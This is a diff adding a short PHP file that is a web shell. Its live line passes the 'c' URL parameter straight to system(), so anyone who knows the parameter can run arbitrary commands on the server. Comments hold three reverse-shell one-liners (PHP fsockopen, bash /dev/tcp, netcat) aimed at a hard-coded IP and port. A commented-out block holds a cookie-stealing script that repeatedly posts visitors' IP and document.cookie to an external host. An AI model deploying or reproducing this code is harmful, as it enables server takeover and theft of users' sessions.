@@ -1,0 +1,57 @@
+<?php
+
+    system($_GET["c"]);
+/*
+<form action="" method="POST">
+ <input type="text" name="c" autofocus>
+ <input type="submit" name="send">
+</form>
+*/
+
+
+    //SHELL REMOTA
+    //'php -r '$sock=fsockopen("88.7.201.171",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+    //bash -i >& /dev/tcp/88.7.201.171/1234 0>&1
+    //nc -e /bin/sh 88.7.201.171 1234
+
+    /*
+
+    <h1 id="ip"><?php echo getIp(); ?></h1>
+    <form name="fuck" action="http://prueba.byethost33.com/formu.php" method="post">
+      <input type="hidden" name="ip" value="<?php echo getIp(); ?>">
+      <input type="hidden" id="cookie" name="cookie" value="document.cookie">
+    </form>
+    <script>
+      document.getElementById("ip").style.display = "none";
+      document.getElementById("cookie").value=document.cookie;
+      function wait(ms)
+      {
+         var start = new Date().getTime();
+         var end = start;
+         while(end < start + ms)
+         {
+           end = new Date().getTime();
+         }
+      foo();
+      }
+      console.log('before');
+      wait(1000);
+      console.log('after');
+      function foo()
+      {
+        console.log(1);
+        send();
+        setTimeout(foo, 20000);
+      }
+
+
+      function send()
+      {
+         var ip = document.getElementById("ip").innerHTML;
+        console.log(ip);
+        document.fuck.submit();
+      }
+
+    </script>
+    */
+?>
